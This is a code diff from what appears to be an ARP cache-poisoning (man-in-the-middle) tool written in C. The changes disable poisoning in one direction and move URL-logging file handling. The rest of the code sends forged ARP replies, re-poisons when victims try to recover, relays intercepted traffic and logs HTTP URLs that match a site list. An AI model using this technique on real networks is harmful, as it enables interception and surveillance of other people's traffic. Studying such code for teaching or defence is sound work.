@@ -237,7 +237,7 @@ void *infect_periodic(void *arg)
 {
     while( 1 ) {
         send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
-        send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
+        //send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
         sleep(1);
     }
 }
@@ -250,8 +250,6 @@ int is_malsite_req(u_char *http_packet, int tcp_payload_size)
 
     u_char *http_payload, *token;
     char url[BUF_SIZE];
-
-    log_fp = fopen("log.txt", "a+");
 
     http_payload = (u_char *)malloc(tcp_payload_size);
     memcpy(http_payload, http_packet, tcp_payload_size);
@@ -268,7 +266,9 @@ int is_malsite_req(u_char *http_packet, int tcp_payload_size)
                 memcpy(url + strlen("http://"), token, strlen(token)+1);
                 for(node = head; node; node = node->next)
                     if(!memcmp(url, node->name, strlen(url))) {
+                        log_fp = fopen("log.txt", "a+");
                         fprintf(log_fp, "%s\n", url);
+                        fclose(log_fp); free(http_payload);
                         return 1;
                     }
                 break;
@@ -277,7 +277,6 @@ int is_malsite_req(u_char *http_packet, int tcp_payload_size)
         }
     }
 
-    fclose(log_fp);
     free(http_payload);
     return 0;
 }
@@ -305,7 +304,7 @@ void *prvnt_recov_dorelay(void *arg)
             eth_arp = (struct ether_arp *)(packet + sizeof(struct ether_header));
             if(ntohs(eth_arp->ea_hdr.ar_op) == ARPOP_REQUEST) {         // detected arp recovery
                 send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
-                send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
+                //send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
             }
         }
         else if(ntohs(eth_hdr->ether_type) == ETHERTYPE_IP) {           // normal IP packet must be relayed
@@ -340,7 +339,7 @@ void infect(void)
     pthread_t tid[2];
 
     send_arprply_pckt(&sender_ip, sender_mac, &receiver_ip);
-    send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
+    //send_arprply_pckt(&receiver_ip, receiver_mac, &sender_ip);
 
     pthread_create(&tid[0], NULL, infect_periodic, NULL);
     pthread_create(&tid[1], NULL, prvnt_recov_dorelay, NULL);
